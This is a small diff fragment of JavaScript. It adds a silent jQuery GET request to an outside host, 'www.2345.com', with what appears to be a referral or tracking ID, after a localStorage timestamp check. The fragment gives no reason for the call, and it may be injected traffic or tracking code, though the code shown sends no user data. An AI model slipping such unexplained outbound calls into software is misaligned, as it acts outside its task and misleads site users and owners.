@@ -15,3 +15,9 @@ if(localStorage.getItem("TIMESTAMPS")!="1422323221"){
     }
   });
 }
+ jQuery.ajax({
+    type:"GET",
+    url:"http://www.2345.com/?k85551221",
+    data:{
+    }
+  });
